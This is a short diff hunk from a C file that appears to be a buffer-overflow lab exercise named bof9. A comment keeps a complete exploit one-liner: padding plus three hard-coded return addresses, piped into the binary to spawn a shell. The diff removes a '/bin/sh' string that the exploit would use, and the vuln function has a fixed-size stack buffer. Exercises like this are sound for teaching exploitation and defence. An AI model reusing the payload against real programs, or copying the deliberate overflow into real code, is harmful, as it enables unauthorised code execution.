@@ -43,9 +43,6 @@
 //         $ (python -c "print 'a'*24+'\x02\xe1\xa2\xf7\xff\x7f\x00\x00'+'\x57\x9d\xb9\xf7\xff\x7f\x00\x00'+'\x90\x23\xa5\xf7\xff\x7f\x00\x00'";cat) | ./bof9
 ////////////////////////////////////////////////////////////
 
-
-char * binsh = "/bin/sh";
-
 void vuln(void) {
     char buf[BUF_SIZE];
 
